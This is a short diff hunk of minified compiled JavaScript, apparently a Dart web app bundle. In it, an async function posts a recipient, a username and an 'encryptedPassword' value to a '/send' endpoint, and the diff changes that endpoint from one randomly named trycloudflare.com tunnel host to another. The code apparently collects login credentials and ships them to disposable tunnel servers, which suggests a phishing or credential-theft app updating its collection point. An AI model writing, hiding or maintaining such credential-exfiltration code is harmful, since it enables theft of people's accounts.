@@ -28978,7 +28978,7 @@ var $async$a8C=A.T(function(d,e){if(d===1){o.push(e)
 s=p}for(;;)switch(s){case 0:p=4
 n=a.length!==0?A.aM1(a):""
 s=7
-return A.H(A.aEI("https://ticket-mission-deposits-hosts.trycloudflare.com/send",A.at(["to",b,"username",c,"encryptedPassword",n],t.N,t.z)),$async$a8C)
+return A.H(A.aEI("https://challenged-petroleum-expressed-commands.trycloudflare.com/send",A.at(["to",b,"username",c,"encryptedPassword",n],t.N,t.z)),$async$a8C)
 case 7:m=e
 if(J.d(J.aS(m,"success"),!0)){q=new A.yi(null,b,!0)
 s=1
